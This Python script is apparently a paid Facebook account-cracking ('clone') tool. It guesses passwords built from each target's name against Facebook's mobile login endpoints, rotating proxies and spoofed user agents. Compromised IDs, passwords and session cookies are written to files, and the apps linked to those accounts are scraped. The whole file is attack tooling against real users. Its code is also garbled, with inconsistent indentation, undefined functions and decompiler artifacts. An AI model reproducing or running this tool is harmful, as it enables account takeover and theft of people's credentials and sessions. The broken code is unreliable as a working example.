#!/usr/bin/python3
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as sarfrazssb
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mBasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
header_grup = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.5; rv:103.0) Gecko/20100101 Firefox/103.0 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
header_grup = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
header_grup = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.71 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo =                                          """   
              ###    ##     ## ########  
            ## ##    ##   ##  ##     ## 
          ##   ##    ## ##   ##     ## 
          ##     ##    ###    ########  
          #########   ## ##   ##     ## 
          ##     ##  ##   ##  ##     ## 
          ##     ## ##     ## ########  
=================================================
    [-] AUTHOR    :\033[1;32m AZAN CHAUDRY
    [-] GITHUB    :\033[1;32m MR-AZAN
    [-] WhatsApp  :\033[1;32m +923165456679
    [-] TOOLS     :\033[1;32m FILE CLONE
    [-] VERSION   :\033[1;32m 1.2
    [-] STATUS    :\033[1;32m PAID
================================================== """                         
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mSSB_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSSB_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back SSB Menu ")
	    sarfraz()

def sarfraz():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print
    print(' [1] Crack File ')
    print(' [2] Dump Create File ')
    print(' [3] Remove Dubal Links')
    print(' [4] Login Tool ')
    print(' [5] Logout Cookie ')
    print(' [w] Join Whatsapp Group ')
    print(' [f] Exit ')
    print('\033[1;97m-----------------------------------------------') 
    _sarfraz___ = input(' [\x1b[1;91m?\x1b[1;97m] Select Menu: ')
    if _sarfraz___ in ('1', '01'):
        __xxx__().sarfrazx(id)
    if _sarfraz___ in ('2', '02'):
        create_file()
    
    if _sarfraz___ in ('3', '03'):
        dupcutter()
    if _sarfraz___ in ('4', '04'):
    	pass
    if _sarfraz___ in ('4', '04'):
    	pass
    os.system("xdg-open  ")
class __xxx__:
    def __init__(self):
        self.id = []
    def sarfrazx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('Put File Name : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")      
        cetak(nel('[bold green]➣1. MOBILE \x1b[1;91m[SLOW]\n➣2. MBASIC \x1b[1;92m[VERY FIRST]\n➣3. TOUCH \x1b[1;91m [SLOW]\n➣4. MTOUCH \x1b[1;91m[SLOW] [bold green]'))
	    print('')
	    hc = input('>> CHOOSE : ')
	    if hc in ('1', '01'):
		     method.append('mobile')
	elif hc in ('2', '02'):
		    method.append('mobile')
	elif hc in ('3', '03'):
		    method.append('mobile')
	elif hc in ('4', '04'):
		    method.append('mbasic')
	else:
		    method.append('mobile')
	os.system('clear')
	banner()
	print('')
	_jembot_ = input('\x1b[1;92m=>SHOW APKS ( Y/t ) ')
	pwplus = input('=>\x1b[1;92mPASWORD MENU MENUAL(CHOISE)/DEFULT(AUTO)( M/D ) ')
	if pwplus in ('y', 'Y'):
		pwpluss.append('ya')
		cetak(nel('[[purple]•[yellow]] ADD PASWORD MXM 6 WORDS\n[[purple]•[yellow]] EXIMPLE :[green] 556677,786786,123456[purple] '))
		pwku = input('#=>Add PASSWORDS : ')
		pwkuh = pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit()

def complete():
	print('')
	print('%s══════════════════════════════════════════' % N)
	print('\x1b[1;92mSCANNING COMPLETE')
	print('\x1b[1;92m💚TOTAL ID : ' + str(len(id)))
	print('\x1b[1;92m💚TOTAL OK : ' + str(ok))
	print('\x1b[1;91m❤️TOTAL CP : ' + str(cp))
	print('%s══════════════════════════════════════════' % N)

def passwrd():
	os.system('clear')
	banner()
	print('\x1b[1;92m══════════════════════════════════════════')
	print('👉\x1b[1;92mYOUR CLONEING STARTED')
	print('👉\x1b[1;92mTOTAL IDZ : ' + str(len(id)))
	print('👉\x1b[1;92mYOUR OK ID SAVED: rr_ok.txt')
	print('👉\x1b[1;91mYOUR CP ID SAVED: rr_cp.txt')
	print('👉\x1b[1;92mYOUR CLONING STOP PRESS CTRL THAN Z')
	print('\x1b[1;92m══════════════════════════════════════════')
	print('')
	with tred(30, **('max_workers',)) as pool:
		for yuzong in id2:
			idf = yuzong.split('|')[0]
			nmf = yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf) < 6:
				if len(frs) < 3:
					pass
				else:
					pwv.append(frs + '123')
					pwv.append(frs + '1234')
					pwv.append(frs + '12345')
					pwv.append(frs + '1122')
			elif len(frs) < 3:
				pwv.append(nmf)
			else:
				pwv.append(nmf)
				pwv.append(frs + '123')
				pwv.append(frs + '1234')
				pwv.append(frs + '12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			if 'mobile' in method:
				pool.submit(crack, idf, pwv)
			elif 'free' in method:
				pool.submit(crack, idf, pwv)
			elif 'touch' in method:
				pool.submit(crack, idf, pwv)
			elif 'mbasic' in method:
				pool.submit(crack, idf, pwv)
			else:
				pool.submit(crack, idf, pwv)
	print('')
	complete()

def crack(idf, pwv):
	global cp, ok, loop
	bo = random.choice([m, k, h, b, u, x])
	(sys.stdout.write(f"\r{b}RR_CRACK{P} [{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  "),)
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip = random.choice(prox)
			proxs = {'http': 'socks4://' + nip}
			ses.headers.update({'Host': 'm.facebook.com','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/','accept-encoding': 'gzip, deflate br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa = {'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),'uid': idf,'next': 'https://p.facebook.com/login/save-device/','flow': 'login_no_pin','pass': pw}
			koki = ';'.join(['%s=%s' % (key, value) for key, value in p.cookies.get_dict().items()])
			koki += ' m_pixel_ratio=2.625; wd=412x756'
			heade = {'Host': 'm.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
			if 'checkpoint' in po.cookies.get_dict().keys():
				print('')
				print('')
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m[✓] STATUS		: \x1b[1;96mRR_CP🥀')
				print(f"\x1b[1;91m[✓] USER ID	   : {idf}\n\x1b[1;91m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER AGENT: ')
				print(f"\r{ua}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('')
				print('')
				open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
				open('RR_CP.txt', 'a').write(idf + '|' + pw + '\n')
				akun.append(idf + '|' + pw)
				cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				ok += 1
				coki = po.cookies.get_dict()
				kuki = ';'.join(['%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
				print('')
				print('')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] STATUS		: \x1b[1;96mRR_OK💚')
				print(f"\x1b[1;92m[✓] USER ID	   : {idf}\n\x1b[1;92m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER COOKIES: ')
				print(f"\r{kuki}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER AGENT: ')
				print(f"\r{ua}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('')
				open('RR_Ok.txt', 'a').write(idf + '|' + pw + '|' + ua + '\n')
				open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + ua + '\n')
				cek_apk(session, coki)
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		loop += 1
def crackfree(idf, pwv):
	global cp, ok, loop
	(sys.stdout.write(f"\r{b}RR_CRACK{P} [{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  "),)
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'p.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','sec-fetch-dest': 'document','referer': 'https://p.facebook.com/','accept-encoding': 'gzip, deflate br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			dataa = {'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),'uid': idf,'next': 'https://p.facebook.com/login/save-device/','flow': 'login_no_pin','pass': pw}
			koki = ';'.join(['%s=%s' % (key, value) for key, value in p.cookies.get_dict().items()])
			koki += ' m_pixel_ratio=2.625; wd=412x756'
			heade = {'Host': 'p.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://p.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
			if 'checkpoint' in po.cookies.get_dict().keys():
				print('')
				print('')
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m[✓] STATUS		: \x1b[1;96mRR_CP🥀')
				print(f"\x1b[1;91m[✓] USER ID	   : {idf}\n\x1b[1;91m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER AGENT: ')
				print(f"\r{ua}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('')
				print('')
				open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
				open('RR_CP.txt', 'a').write(idf + '|' + pw + '\n')
				akun.append(idf + '|' + pw)
				cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				ok += 1
				coki = po.cookies.get_dict()
				kuki = ';'.join(['%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
				print('')
				print('')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] STATUS		: \x1b[1;96mRR_OK💚')
				print(f"\x1b[1;92m[✓] USER ID	   : {idf}\n\x1b[1;92m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER COOKIES: ')
				print(f"\r{kuki}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER AGENT: ')
				print(f"\r{ua}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('')
				open('RR_OK.txt', 'a').write(idf + '|' + pw + kuki + '\n')
				open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')
				cek_apk(session, coki)
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		loop += 1

def cracktouch(idf, pwv):
	global cp, ok, loop
	bi = random.choice([u, k, kk, b, h, hh])
	pers = loop * 100 / len(id2)
	fff = '%'
	nip = random.choice(prox)
	proxs = {'http': 'socks5://' + nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x))
	sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/','accept-encoding': 'gzip, deflate br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa = {'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1), 'uid': idf, 'next': 'https://p.facebook.com/login/save-device/', 'flow': 'login_no_pin', 'pass': pw}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr','accept-encoding': 'gzip, deflate br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'})
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
			koki = ';'.join(['%s=%s' % (key, value) for key, value in p.cookies.get_dict().items()])
			koki += ' m_pixel_ratio=2.625; wd=412x756'
			if 'checkpoint' in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf + '|' + pw)
					ceker(idf, pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'''[•] ID	   : {idf} [•] PASSWORD : {pw}'''
					statuscp1 = nel(statuscp, 'red', **('style',))
					cetak(nel(statuscp1, 'RR CP', **('title',)))
					open('RR_CP.txt', 'a').write(idf + '|' + pw + '\n')
					akun.append(idf + '|' + pw)
					cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				headapp = {
					'user-agent': 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]' }
				if 'no' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('/sdcard/JAHID-KING/OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					print('\n')
					statusok = f'''[•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, 'NAYIM-KING  OK', **('title',)))
					ok += 1
				elif 'ya' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join(['%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('RR_OK.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					user = idf
					infoakun = ''
					session = requests.Session()
					cek2 = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', coki, headapp, **('cookies', 'headers')).text
					cek = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', coki, headapp, **('cookies', 'headers')).text
					infoakun += '\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n'
					apkaktif = re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>', str(cek))
					nok = 1
					for muncul in apkaktif:
						infoakun += f'''[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n'''
						nok += 1
					hit = 0
					infoakun += '\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n'
					apkexp = re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>', str(cek2))
					hit = 0
					for muncul in apkexp:
						hit += 1
						infoakun += f'''[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n'''
					print('\n')
					statusok = f'''[bold green][•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, '[bold green]RR_OK[/bold green]', **('title',)))
					ok += 1
				else:
					continue
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		loop += 1

def crackmbasic(idf, pwv):
	global cp, ok, loop
	bi = random.choice([u, k, kk, b, h, hh])
	pers = loop * 100 / len(id2)
	fff = '%'
	nip = random.choice(prox)
	proxs = {'http': 'socks5://' + nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x))
	sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa = { 'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1), 'uid': idf, 'next': 'https://mbasic.facebook.com/login/save-device/', 'flow': 'login_no_pin', 'pass': pw}
			koki = ';'.join(['%s=%s' % (key, value) for key, value in p.cookies.get_dict().items()])
			koki += ' m_pixel_ratio=2.625; wd=412x756'
			heade = {'connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
			if 'checkpoint' in po.cookies.get_dict().keys() or 'ya' in oprek:
				akun.append(idf + '|' + pw)
				ceker(idf, pw)
				if 'ya' in princp:
					print('\n')
					statuscp = f'''[•] ID	   : {idf} [•] PASSWORD : {pw}'''
					statuscp1 = nel(statuscp, 'red', **('style',))
					cetak(nel(statuscp1, 'RR_CP', **('title',)))
					open('RR_CP.txt', 'a').write(idf + '|' + pw + '\n')
					akun.append(idf + '|' + pw)
					cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				headapp = {'user-agent': 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'}
				if 'no' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('RR_OK.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					print('\n')
					statusok = f'''[•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, 'OK', **('title',)))
					ok += 1
				elif 'ya' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('RR_OK.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					user = idf
					infoakun = ''
					session = requests.Session()
					cek2 = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', coki, headapp, **('cookies', 'headers')).text
					cek = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', coki, headapp, **('cookies', 'headers')).text
					infoakun += '\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n'
					apkaktif = re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>', str(cek))
					nok = 1
					for muncul in apkaktif:
						infoakun += f'''[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n'''
						nok += 1
					hit = 0
					infoakun += '\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n'
					apkexp = re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>', str(cek2))
					hit = 0
					for muncul in apkexp:
						hit += 1
						infoakun += f'''[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n'''
					print('\n')
					statusok = f'''[bold green][•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, '[bold green]RR_OK[/bold green]', **('title',)))
					ok += 1
				else:
					continue
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		loop += 1

def ceker(idf, pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email': idf, 'pass': pw, 'login': 'submit'}, headers=head, allow_redirects=True).text, 'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh', 'jazoest', 'fb_dtsg', 'submit[Continue]', 'checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'): anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com' + str(jo['action']), data, head, **('data', 'headers')).text, 'html.parser')
